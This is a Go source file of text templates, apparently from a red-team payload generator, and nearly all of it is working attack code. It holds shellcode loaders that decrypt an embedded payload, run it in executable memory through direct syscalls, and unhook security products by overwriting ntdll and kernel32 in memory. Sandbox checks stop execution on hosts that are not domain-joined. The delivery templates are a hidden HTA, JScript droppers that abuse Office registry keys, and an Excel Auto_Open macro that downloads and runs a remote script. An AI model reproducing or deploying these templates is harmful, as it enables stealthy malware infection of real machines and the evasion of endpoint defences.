package Struct

func Sandbox() string {
	return `
	func {{.Variables.IsDomainJoined}}() (bool, error) {
		var {{.Variables.domain}} *uint16
		var {{.Variables.status}} uint32
		err := syscall.NetGetJoinInformation(nil, &{{.Variables.domain}}, &{{.Variables.status}})
		if err != nil {
			return false, err
		}
		syscall.NetApiBufferFree((*byte)(unsafe.Pointer({{.Variables.domain}})))
		return {{.Variables.status}} == syscall.NetSetupDomainName, nil
	}
	`
}

func Sandbox_DomainJoined() string {
	return `
	var {{.Variables.checker}} bool
		{{.Variables.checker}}, _ = {{.Variables.IsDomainJoined}}()
	if {{.Variables.checker}} == true {
	} else {
		os.Exit(3)
	}`
}

func JS_Office_Export() string {
	return `
	//export xlAutoOpen
	func xlAutoOpen() {
		Start()
	}`
}

func JS_Control_Export() string {
	return `
	//export CPlApplet
	func CPlApplet() {
		Start()
	}`
}

func WS_JS_Export() string {
	return `
	//export DllRegisterServer
	func DllRegisterServer() {
		Start()
	}
	
	//export DllGetClassObject
	func DllGetClassObject() {
		Start()
	}
	
	//export DllUnregisterServer
	func DllUnregisterServer() {
		Start()
	}`
}

func WScript_Sandbox() string {
	return `
	var {{.Variables.objShell}} = new ActiveXObject("Shell.Application")
	var {{.Variables.domain}} =  {{.Variables.objShell}}.GetSystemInformation("IsOS_DomainMember");
	if ({{.Variables.domain}} == 0 ){
	}
	else {
		{{.Variables.loader}}
	}	
`
}

func HTA() string {
	return `<HTML>
	<HEAD>
	</HEAD>
	<BODY>
	<script language="javascript" >
	window.resizeTo(0,0);
	{{.Variables.payload}}
	window.close();
	</script>
	</BODY>
	</HTML>
`
}

func JS_Office_Sub() string {
	return `

	var {{.Variables.fso}} = new ActiveXObject("Scripting.FileSystemObject");
	var {{.Variables.dropPath}} = {{.Variables.fso}}.GetSpecialFolder(2);
	var {{.Variables.objapp}} = new ActiveXObject("{{.Variables.RegName}}.Application");
	{{.Variables.objapp}}.Visible = false;
	var {{.Variables.Application_Version}} = {{.Variables.objapp}}.Version;
	var {{.Variables.WshShell}} = new ActiveXObject("WScript.Shell");
	var {{.Variables.strRegPath}} = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + {{.Variables.Application_Version}} + "\\{{.Variables.RegName}}\\Options\\OPEN";
	var {{.Variables.value}} = ""+{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}";
	{{.Variables.WshShell}}.RegWrite({{.Variables.strRegPath}},{{.Variables.value}}, "REG_SZ");
	var {{.Variables.objShell}} = new ActiveXObject("shell.application");     
    {{.Variables.objShell}}.ShellExecute("{{.Variables.ApplicationName}}", "", "", "open", 0);
	WScript.Sleep(20000);
	
	{{.Variables.WshShell}}.RegDelete({{.Variables.strRegPath}});
	{{.Variables.WshShell}}.RegDelete("HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + {{.Variables.Application_Version}} + "\\{{.Variables.RegName}}\\Resiliency\\StartupItems\\");

	`
}

func JS_Control_Sub() string {
	return `
	var {{.Variables.objShell}} = new ActiveXObject("shell.application");     
    {{.Variables.objShell}}.ShellExecute({{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}", "", "", "", 1);
	`
}

func JSfile() string {
	return `
	try {
	

	var {{.Variables.fso}} = new ActiveXObject("Scripting.FileSystemObject");
	var {{.Variables.dropPath}} = {{.Variables.fso}}.GetSpecialFolder(2);

    var {{.Variables.base6411}}={ {{.Variables.characters}}:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function({{.Variables.atest}}){ {{.Variables.base6411}}.{{.Variables.characters}};var {{.Variables.rtest}}="",{{.Variables.ctest}}=0;do{var {{.Variables.etest}}={{.Variables.atest}}.charCodeAt({{.Variables.ctest}}++),{{.Variables.ttest}}={{.Variables.atest}}.charCodeAt(c++),{{.Variables.htest}}=a.charCodeAt(c++),s=(e=e||0)>>2&63,A=(3&e)<<4|(t=t||0)>>4&15,o=(15&t)<<2|(h=h||0)>>6&3,B=63&h;t?h||(B=64):o=B=64,{{.Variables.rtest}}+={{.Variables.base6411}}.{{.Variables.characters}}.charAt(s)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(A)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(o)+{{.Variables.base6411}}.{{.Variables.characters}}.charAt(B)}while(c<a.length);return {{.Variables.rtest}}}};
    function Magic1({{.Variables.rtest}}){if(!/^[a-z0-9+/]+={0,2}$/i.test({{.Variables.rtest}})||{{.Variables.rtest}}.length%4!=0)throw Error("Not {{.Variables.base6411}} string");for(var t,e,n,o,i,a,f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",h=[],d=0;d<{{.Variables.rtest}}.length;d+=4)t=(a=f.indexOf({{.Variables.rtest}}.charAt(d))<<18|f.indexOf({{.Variables.rtest}}.charAt(d+1))<<12|(o=f.indexOf({{.Variables.rtest}}.charAt(d+2)))<<6|(i=f.indexOf({{.Variables.rtest}}.charAt(d+3))))>>>16&255,e=a>>>8&255,n=255&a,h[d/4]=String.fromCharCode(t,e,n),64==i&&(h[d/4]=String.fromCharCode(t,e)),64==o&&(h[d/4]=String.fromCharCode(t));return {{.Variables.rtest}}=h.join("")}
    function {{.Variables.binaryWriter}}({{.Variables.res1}},{{.Variables.filename1}})
    {var {{.Variables.base6411}}decoded=Magic1({{.Variables.res1}});var {{.Variables.TextStream11}}=new ActiveXObject('ADODB.Stream');{{.Variables.TextStream11}}.Type=2;{{.Variables.TextStream11}}.charSet='iso-8859-1';{{.Variables.TextStream11}}.Open();{{.Variables.TextStream11}}.WriteText({{.Variables.base6411}}decoded);var {{.Variables.BinaryStream}}=new ActiveXObject('ADODB.Stream');{{.Variables.BinaryStream}}.Type=1;{{.Variables.BinaryStream}}.Open();{{.Variables.TextStream11}}.Position=0;{{.Variables.TextStream11}}.CopyTo({{.Variables.BinaryStream}});{{.Variables.BinaryStream}}.SaveToFile({{.Variables.filename1}},2);{{.Variables.BinaryStream}}.Close()}

	var {{.Variables.dll_string1name}} = '{{.Variables.dll_string1}}';
	var {{.Variables.dll_string2name}} = '{{.Variables.dll_string2}}';
	
	var {{.Variables.dll}} = {{.Variables.dll_string1name}} + {{.Variables.dll_string2name}};
    
   
	{{.Variables.binaryWriter}}({{.Variables.dll}},{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}");
	{{.Variables.Loader}}


}catch(e) {
}
`
}

func Macro() string {
	return `Sub Auto_Open()
    Dim {{.Variables.pathOfFile}} As String
    Dim {{.Variables.Full}} As String
    Dim {{.Variables.t}} As String
    {{.Variables.pathOfFile}} = Environ("AppData") & "\Microsoft\Excel\"
    VBA.ChDir {{.Variables.pathOfFile}}

    Dim {{.Variables.remoteFile}} As String
    Dim {{.Variables.storeIn}} As String
    Dim {{.Variables.HTTPReq}} As Object

    {{.Variables.remoteFile}} = "{{.Variables.URL}}{{.Variables.outFile}}"
    {{.Variables.storeIn}} = "{{.Variables.outFile}}"
    Set {{.Variables.HTTPReq}} = CreateObject("Microsoft.XMLHTTP")
    {{.Variables.HTTPReq}}.Open "GET", {{.Variables.remoteFile}}, False
    {{.Variables.HTTPReq}}.send

	If {{.Variables.HTTPReq}}.Status = 200 Then
        Set {{.Variables.output}} = CreateObject("ADODB.Stream")
        {{.Variables.output}}.Open
        {{.Variables.output}}.Type = 1
        {{.Variables.output}}.Write {{.Variables.HTTPReq}}.responseBody
        {{.Variables.output}}.SaveToFile {{.Variables.storeIn}}, 2
        {{.Variables.output}}.Close
    End If
    {{.Variables.Full}} = {{.Variables.pathOfFile}} & {{.Variables.storeIn}}
    Set {{.Variables.obj}} = GetObject("new:0006F03A-0000-0000-C000-000000000046")
	{{.Variables.obj}}.CreateObject("WScript.Shell").Run("c" & "s" & "c" & "r" & "i" & "p" & "t" & " //E:jscript " & {{.Variables.Full}}), 0
	{{.Variables.sleep}}
	Kill {{.Variables.Full}}
	End Sub
	Sub {{.Variables.sleep}}()
	Dim when As Variant
		Debug.Print "Start " & Now
		when = Now + TimeValue("00:00:30")
		Do While when > Now
			DoEvents
		Loop
		Debug.Print "End " & Now
	End Sub
`
}

func WS_JS() string {
	return `
	var {{.Variables.manifest}} = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?> <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"> 	<assemblyIdentity type="win32" name="{{.Variables.DLLName}}" version="0.0.0.0"/> 	<file name="{{.Variables.FileName}}.dll">     	<comClass         	description="Description"         	clsid="{89565276-A714-4a43-912E-978B935EDCCC}"         	threadingModel="Both"         	progid="{{.Variables.progid}}"/> 	</file>  </assembly>';    
   
	var {{.Variables.ax}} = new ActiveXObject("Microsoft.Windows.ActCtx");
	{{.Variables.ax}}.ManifestText = {{.Variables.manifest}};
	var {{.Variables.Execute}} = {{.Variables.ax}}.CreateObject("{{.Variables.progid}}");
`
}

func DLL_Refresher() string {
	return `
	package main

	import "C"

	import (
		"crypto/aes"
		"crypto/cipher"
		"debug/pe"
		"encoding/base64"
		"encoding/hex"
		"loader/loader"
		"os"
		"io/ioutil"
		"strconv"
		"syscall"
		"unsafe"

		"golang.org/x/sys/windows"
		"golang.org/x/sys/windows/registry"
	
	)

	var  (
		{{.Variables.customsyscall}} uint16
		{{.Variables.customsyscallVP}} uint16
	)

	func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
		{{.Variables.length}} := len({{.Variables.src}})
		{{.Variables.unpadding}}  := int({{.Variables.src}}[{{.Variables.length}}-1])
		return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
	}
	
	{{.Variables.Sandboxfunction}}
	
	func {{.Variables.Versionfunc}}() string {
		{{.Variables.k}}, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		{{.Variables.Version}}, _, _ :=  {{.Variables.k}}.GetStringValue("CurrentVersion")
		{{.Variables.MV}}, _, err := {{.Variables.k}}.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			{{.Variables.MinV}}, _, _ := {{.Variables.k}}.GetIntegerValue("CurrentMinorVersionNumber")
			{{.Variables.Version}} = strconv.FormatUint({{.Variables.MV}}, 10) + "." + strconv.FormatUint({{.Variables.MinV}}, 10)
		}
		defer {{.Variables.k}}.Close()
				{{.Variables.SyscallNumberlist}}

	}
	
		
	func {{.Variables.loader}}()  {
		err := {{.Variables.Reloading}}("C:\\Windows\\System32\\kernel32.dll")
		if err != nil {
		}
		err = {{.Variables.Reloading}}("C:\\Windows\\System32\\kernelbase.dll")
		if err != nil {
		}
		err = {{.Variables.Reloading}}("C:\\Windows\\System32\\ntdll.dll")
		if err != nil {
		}

	}

	func main() {
	}

	{{.Variables.ExportName}}


	//export Start
	func Start() {
		{{.Variables.Sandbox}}
		{{.Variables.Version}} := {{.Variables.Versionfunc}}()
		if {{.Variables.Version}} == "10.0" {
			{{.Variables.loader}}()
		}
		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString("{{.Variables.ciphertext}}")
		{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
		{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
	
		{{.Variables.block}}, err := aes.NewCipher({{.Variables.vkey}})
		if err != nil {
			return
		}
	
	
		if len({{.Variables.vciphertext}}) < aes.BlockSize {
			return
		}
	
		{{.Variables.decrypted}} := make([]byte, len({{.Variables.vciphertext}}))
		{{.Variables.mode}} := cipher.NewCBCDecrypter({{.Variables.block}}, {{.Variables.viv}})
		{{.Variables.mode}}.CryptBlocks({{.Variables.decrypted}}, {{.Variables.vciphertext}})
		{{.Variables.stuff}} := {{.Variables.PKCS5UnPadding}}({{.Variables.decrypted}})
	
		{{.Variables.rawdata}} := (string({{.Variables.stuff}}))
		{{.Variables.hexdata}}, _ := base64.StdEncoding.DecodeString({{.Variables.rawdata}})
		{{.Variables.raw_bin}}, _ := hex.DecodeString(string({{.Variables.hexdata}}))
		os.Stdout, _ = os.Open(os.DevNull)
	

		var {{.Variables.phandle}} uint64
		var {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.alloctype}}, {{.Variables.protect}} uintptr
		{{.Variables.phandle}} = 0xffffffffffffffff
		{{.Variables.regionsizep}} := len({{.Variables.raw_bin}})
		{{.Variables.regionsize}} := uintptr({{.Variables.regionsizep}})
		{{.Variables.protect}} = 0x40
		{{.Variables.alloctype}} = 0x3000
		{{.Variables.ptr}} := loader.Allocate({{.Variables.customsyscall}}, {{.Variables.phandle}}, {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.regionsize}}, {{.Variables.alloctype}}, {{.Variables.protect}}, 0)
		{{.Variables.buff}}  := (*[1890000]byte)(unsafe.Pointer({{.Variables.ptr}}))
		for x, y := range []byte({{.Variables.raw_bin}}) {
			{{.Variables.buff}} [x] = y
		}
		syscall.Syscall({{.Variables.ptr}}, 0, 0, 0, 0)
	}
	func {{.Variables.Reloading}}(name string) error {
		{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile(name)
		if {{.Variables.error}} != nil {
			return {{.Variables.error}}
		}
		{{.Variables.file}}, {{.Variables.error}} := pe.Open(name)
		if {{.Variables.error}} != nil {
			return {{.Variables.error}}
		}
		{{.Variables.x}} := {{.Variables.file}}.Section(".text")
		{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
		{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL(name)
		if {{.Variables.error}} != nil {
			return {{.Variables.error}}
		}
		{{.Variables.handle}} := {{.Variables.loaddll}}.Handle
		{{.Variables.dllBase}} := uintptr({{.Variables.handle}})
		{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
		var {{.Variables.oldfartcodeperms}} uintptr
		{{.Variables.regionsize}} := uintptr(len({{.Variables.bytes}}))
		{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
		{{.Variables.runfunc}}, _ := NtProtectVirtualMemory(
			{{.Variables.customsyscallVP}}, 
			{{.Variables.handlez}},
			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
			&{{.Variables.regionsize}},
			syscall.PAGE_EXECUTE_READWRITE,
			&{{.Variables.oldfartcodeperms}},
		)
		if {{.Variables.runfunc}} != 0 {
			panic("Call to VirtualProtect failed!")
		}

		for i := 0; i < len({{.Variables.bytes}}); i++ {
			{{.Variables.loc}} := uintptr({{.Variables.dllOffset}} + uint(i))
			{{.Variables.mem}} := (*[1]byte)(unsafe.Pointer({{.Variables.loc}}))
			(*{{.Variables.mem}})[0] = {{.Variables.bytes}}[i]
		}

		{{.Variables.runfunc}}, _ = NtProtectVirtualMemory(
			{{.Variables.customsyscallVP}}, 
			{{.Variables.handlez}},
			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
			&{{.Variables.regionsize}},
			{{.Variables.oldfartcodeperms}},
			&{{.Variables.oldfartcodeperms}},
		)
		if {{.Variables.runfunc}} != 0 {
			panic("Call to VirtualProtect failed!!")
		}

		return nil
	}
	func NtProtectVirtualMemory({{.Variables.sysid}} uint16, {{.Variables.processHandle}} uintptr, {{.Variables.baseAddress}}, {{.Variables.regionSize}} *uintptr, {{.Variables.NewProtect}} uintptr, {{.Variables.oldprotect}} *uintptr) (uint32, error) {

		return loader.NtProtectVirtualMemory(
			{{.Variables.sysid}},
			{{.Variables.processHandle}},
			uintptr(unsafe.Pointer({{.Variables.baseAddress}})),
			uintptr(unsafe.Pointer({{.Variables.regionSize}})),
			{{.Variables.NewProtect}},
			uintptr(unsafe.Pointer({{.Variables.oldprotect}})),
		)
	}
	


`
}

func Binary() string {
	return `
	package main

	import (
		"crypto/aes"
		"crypto/cipher"
		"debug/pe"
		"encoding/base64"
		"encoding/hex"
		"fmt"
		"loader/loader"
		{{.Variables.DebugImport}}
		"os"
		"io/ioutil"
		"syscall"
		"unsafe"
		"strconv"
	
		"golang.org/x/sys/windows"
		"golang.org/x/sys/windows/registry"

	)


	{{.Variables.Debug}}

	const (
		{{.Variables.PROCESS_ALL_ACCESS}}= 0x1F0FFF
	)
	var _ unsafe.Pointer
	const (
		{{.Variables.errnoERROR_IO_PENDING}}= 997
	)
	var (
		{{.Variables.errERROR_IO_PENDING}} error = syscall.Errno({{.Variables.errnoERROR_IO_PENDING}})
		{{.Variables.customsyscall}} uint16
	)


	{{.Variables.Sandboxfunction}}

	func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
		{{.Variables.length}} := len({{.Variables.src}})
		{{.Variables.unpadding}}  := int({{.Variables.src}}[{{.Variables.length}}-1])
		return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
	}
	

	func {{.Variables.Console}}(show bool) {
		{{.Variables.getWin}} := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")
		{{.Variables.showWin}} := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")
		{{.Variables.hwnd}}, _, _ := {{.Variables.getWin}}.Call()
		if {{.Variables.hwnd}} == 0 {
				return
		}
		if show {
		   var {{.Variables.SW_RESTORE}} uintptr = 9
		   {{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_RESTORE}})
		} else {
		   var {{.Variables.SW_HIDE}} uintptr = 0
		   {{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_HIDE}})
		}
	}
	
	func {{.Variables.Versionfunc}}() string {
		{{.Variables.k}}, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		{{.Variables.Version}}, _, _ :=  {{.Variables.k}}.GetStringValue("CurrentVersion")
		{{.Variables.MV}}, _, err := {{.Variables.k}}.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			{{.Variables.MinV}}, _, _ := {{.Variables.k}}.GetIntegerValue("CurrentMinorVersionNumber")
			{{.Variables.Version}} = strconv.FormatUint({{.Variables.MV}}, 10) + "." + strconv.FormatUint({{.Variables.MinV}}, 10)
		}
		defer {{.Variables.k}}.Close()
		{{.Variables.VersionMessage}}
			{{.Variables.SyscallNumberlist}}

	}
		

	func errnoErr(e syscall.Errno) error {
		switch e {
		case 0:
			return nil
		case {{.Variables.errnoERROR_IO_PENDING}}:
			return {{.Variables.errERROR_IO_PENDING}}
		}
		return e
	}
	
	func {{.Variables.loader}}()  {
		err := {{.Variables.Reloading}}("C:\\Windows\\System32\\kernel32.dll")
		if err != nil {
			{{.Variables.RefreshPE}}
		}
		err = {{.Variables.Reloading}}("C:\\Windows\\System32\\kernelbase.dll")
		if err != nil {
			{{.Variables.RefreshPE}}
		}
		err = {{.Variables.Reloading}}("C:\\Windows\\System32\\ntdll.dll")
		if err != nil {
			{{.Variables.RefreshPE}}
		}
		{{.Variables.EDR}}

	}
	
	func main() {
		{{.Variables.Sandbox}}
		{{.Variables.hide}}
		{{.Variables.Version}} := {{.Variables.Versionfunc}}()
		if {{.Variables.Version}} == "10.0" {
			{{.Variables.loader}}()
		}
		{{.Variables.Pointer}}
		{{.Variables.ptr}} := func() {
		}
		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString("{{.Variables.ciphertext}}")
		{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
		{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
	
		{{.Variables.block}}, err := aes.NewCipher({{.Variables.vkey}})
		if err != nil {
			return
		}
	
	
		if len({{.Variables.vciphertext}}) < aes.BlockSize {
			return
		}
	
		{{.Variables.decrypted}} := make([]byte, len({{.Variables.vciphertext}}))
		{{.Variables.mode}} := cipher.NewCBCDecrypter({{.Variables.block}}, {{.Variables.viv}})
		{{.Variables.mode}}.CryptBlocks({{.Variables.decrypted}}, {{.Variables.vciphertext}})
		{{.Variables.stuff}} := {{.Variables.PKCS5UnPadding}}({{.Variables.decrypted}})
	
		{{.Variables.rawdata}} := (string({{.Variables.stuff}}))
		{{.Variables.hexdata}}, _ := base64.StdEncoding.DecodeString({{.Variables.rawdata}})
		{{.Variables.raw_bin}}, _ := hex.DecodeString(string({{.Variables.hexdata}}))
		{{.Variables.ShellcodeString}}

		var {{.Variables.oldptrperms}} uintptr
		{{.Variables.handle}} := uintptr(0xffffffffffffffff)
		{{.Variables.regionsize}} := uintptr(len({{.Variables.raw_bin}}))
	
		{{.Variables.runfunc}}, _ := NtProtectVirtualMemory(
			{{.Variables.customsyscall}}, 
			{{.Variables.handle}},
			(*uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),
			&{{.Variables.regionsize}},
			syscall.PAGE_EXECUTE_READWRITE,
			&{{.Variables.oldptrperms}},
		)
		if {{.Variables.runfunc}} != 0 {
			panic("Call to VirtualProtect failed!")
		}
		{{.Variables.CopyPointer}}

		*(**uintptr)(unsafe.Pointer(&{{.Variables.ptr}})) = (*uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}}))

		{{.Variables.OverwrittenShellcode}}
		os.Stdout, _ = os.Open(os.DevNull)
		fmt.Println(len({{.Variables.raw_bin}}))
		var {{.Variables.oldfartcodeperms}} uintptr
	
		{{.Variables.OverWrittenPoint}}

		{{.Variables.runfunc}}, _ = NtProtectVirtualMemory(
			{{.Variables.customsyscall}}, 
			{{.Variables.handle}},
			(*uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}})),
			&{{.Variables.regionsize}},
			syscall.PAGE_EXECUTE_READWRITE,
			&{{.Variables.oldfartcodeperms}},
		)
		if {{.Variables.runfunc}} != 0 {
			panic("Call to VirtualProtect failed!")
		}

		{{.Variables.ptr}}()
	
	}
	func {{.Variables.Reloading}}(name string) error {
		{{.Variables.ReloadingMessage}}
		{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile(name)
		if {{.Variables.error}} != nil {
			return {{.Variables.error}}
		}
		{{.Variables.file}}, {{.Variables.error}} := pe.Open(name)
		if {{.Variables.error}} != nil {
			return {{.Variables.error}}
		}
		{{.Variables.x}} := {{.Variables.file}}.Section(".text")
		{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
		{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL(name)
		if {{.Variables.error}} != nil {
			return {{.Variables.error}}
		}
		{{.Variables.handle}} := {{.Variables.loaddll}}.Handle
		{{.Variables.dllBase}} := uintptr({{.Variables.handle}})
		{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
		var {{.Variables.oldfartcodeperms}} uintptr
		{{.Variables.regionsize}} := uintptr(len({{.Variables.bytes}}))
		{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
		{{.Variables.runfunc}}, _ := NtProtectVirtualMemory(
			{{.Variables.customsyscall}}, 
			{{.Variables.handlez}},
			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
			&{{.Variables.regionsize}},
			syscall.PAGE_EXECUTE_READWRITE,
			&{{.Variables.oldfartcodeperms}},
		)
		if {{.Variables.runfunc}} != 0 {
			panic("Call to VirtualProtect failed!")
		}


		for i := 0; i < len({{.Variables.bytes}}); i++ {
			{{.Variables.loc}} := uintptr({{.Variables.dllOffset}} + uint(i))
			{{.Variables.mem}} := (*[1]byte)(unsafe.Pointer({{.Variables.loc}}))
			(*{{.Variables.mem}})[0] = {{.Variables.bytes}}[i]
		}

		{{.Variables.runfunc}}, _ = NtProtectVirtualMemory(
			{{.Variables.customsyscall}}, 
			{{.Variables.handlez}},
			(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
			&{{.Variables.regionsize}},
			{{.Variables.oldfartcodeperms}},
			&{{.Variables.oldfartcodeperms}},
		)
		if {{.Variables.runfunc}} != 0 {
			panic("Call to VirtualProtect failed!!")
		}

		return nil
	}
	func NtProtectVirtualMemory({{.Variables.sysid}} uint16, {{.Variables.processHandle}} uintptr, {{.Variables.baseAddress}}, {{.Variables.regionSize}} *uintptr, {{.Variables.NewProtect}} uintptr, {{.Variables.oldprotect}} *uintptr) (uint32, error) {

		return loader.NtProtectVirtualMemory(
			{{.Variables.sysid}},
			{{.Variables.processHandle}},
			uintptr(unsafe.Pointer({{.Variables.baseAddress}})),
			uintptr(unsafe.Pointer({{.Variables.regionSize}})),
			{{.Variables.NewProtect}},
			uintptr(unsafe.Pointer({{.Variables.oldprotect}})),
		)
	}

`
}

func DLL() string {
	return `
	package main

	import "C"

	import (
		"crypto/aes"
		"crypto/cipher"
		"encoding/base64"
		"encoding/hex"
		"loader/loader"
		"os"
		"strconv"
		"syscall"
		"unsafe"

		"golang.org/x/sys/windows/registry"
	
	)

	var  (
		{{.Variables.customsyscall}} uint16
	)

	func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
		{{.Variables.length}} := len({{.Variables.src}})
		{{.Variables.unpadding}}  := int({{.Variables.src}}[{{.Variables.length}}-1])
		return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
	}
	
	{{.Variables.Sandboxfunction}}

	func {{.Variables.Versionfunc}}() {
		{{.Variables.k}}, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		{{.Variables.Version}}, _, _ :=  {{.Variables.k}}.GetStringValue("CurrentVersion")
		{{.Variables.MV}}, _, err := {{.Variables.k}}.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			{{.Variables.MinV}}, _, _ := {{.Variables.k}}.GetIntegerValue("CurrentMinorVersionNumber")
			{{.Variables.Version}} = strconv.FormatUint({{.Variables.MV}}, 10) + "." + strconv.FormatUint({{.Variables.MinV}}, 10)
		}
		defer {{.Variables.k}}.Close()
				{{.Variables.SyscallNumberlist}}

	}
		

	func main() {
	}

	{{.Variables.ExportName}}


	//export Start
	func Start() {
		{{.Variables.Sandbox}}
		{{.Variables.Versionfunc}}()
		{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString("{{.Variables.ciphertext}}")
		{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
		{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
	
		{{.Variables.block}}, err := aes.NewCipher({{.Variables.vkey}})
		if err != nil {
			return
		}
	
	
		if len({{.Variables.vciphertext}}) < aes.BlockSize {
			return
		}
	
		{{.Variables.decrypted}} := make([]byte, len({{.Variables.vciphertext}}))
		{{.Variables.mode}} := cipher.NewCBCDecrypter({{.Variables.block}}, {{.Variables.viv}})
		{{.Variables.mode}}.CryptBlocks({{.Variables.decrypted}}, {{.Variables.vciphertext}})
		{{.Variables.stuff}} := {{.Variables.PKCS5UnPadding}}({{.Variables.decrypted}})
	
		{{.Variables.rawdata}} := (string({{.Variables.stuff}}))
		{{.Variables.hexdata}}, _ := base64.StdEncoding.DecodeString({{.Variables.rawdata}})
		{{.Variables.raw_bin}}, _ := hex.DecodeString(string({{.Variables.hexdata}}))
		os.Stdout, _ = os.Open(os.DevNull)
	

		var {{.Variables.phandle}} uint64
		var {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.alloctype}}, {{.Variables.protect}} uintptr
		{{.Variables.phandle}} = 0xffffffffffffffff
		{{.Variables.regionsizep}} := len({{.Variables.raw_bin}})
		{{.Variables.regionsize}} := uintptr({{.Variables.regionsizep}})
		{{.Variables.protect}} = 0x40
		{{.Variables.alloctype}} = 0x3000
		{{.Variables.ptr}} := loader.Allocate({{.Variables.customsyscall}}, {{.Variables.phandle}}, {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.regionsize}}, {{.Variables.alloctype}}, {{.Variables.protect}}, 0)
		{{.Variables.buff}}  := (*[1890000]byte)(unsafe.Pointer({{.Variables.ptr}}))
		for x, y := range []byte({{.Variables.raw_bin}}) {
			{{.Variables.buff}} [x] = y
		}
		syscall.Syscall({{.Variables.ptr}}, 0, 0, 0, 0)
	}

`
}

func WindowsVersion_DLL_Refresher() string {
	return `
		if {{.Variables.Version}} == "10.0" {
			{{.Variables.customsyscall}} = 0x18
			{{.Variables.customsyscallVP}} = 0x50
		} else if {{.Variables.Version}} == "6.3" {
			{{.Variables.customsyscall}} = 0x17
			{{.Variables.customsyscallVP}} = 0x4f
		} else if {{.Variables.Version}} == "6.2" {
			{{.Variables.customsyscall}} = 0x16
			{{.Variables.customsyscallVP}} = 0x4e
		} else if {{.Variables.Version}} == "6.1" {
			{{.Variables.customsyscall}} = 0x15
			{{.Variables.customsyscallVP}}= 0x4d
		}
		return {{.Variables.Version}} 
`
}

func WindowsVersion_DLL() string {
	return `
		if {{.Variables.Version}} == "10.0" {
			{{.Variables.customsyscall}} = 0x18
		} else if {{.Variables.Version}} == "6.3" {
			{{.Variables.customsyscall}} = 0x17
		} else if {{.Variables.Version}} == "6.2" {
			{{.Variables.customsyscall}} = 0x16
		} else if {{.Variables.Version}} == "6.1" {
			{{.Variables.customsyscall}} = 0x15
		}
		return
	`
}

func WindowsVersion_Binary() string {
	return `
		
		if {{.Variables.Version}} == "10.0" {
			{{.Variables.customsyscall}} = 0x50
		} else if {{.Variables.Version}} == "6.3" {
			{{.Variables.customsyscall}} = 0x4f
		} else if {{.Variables.Version}} == "6.2" {
			{{.Variables.customsyscall}} = 0x4e
		} else if {{.Variables.Version}} == "6.1" {
			{{.Variables.customsyscall}}= 0x4d
		}
		return {{.Variables.Version}} 
`
}
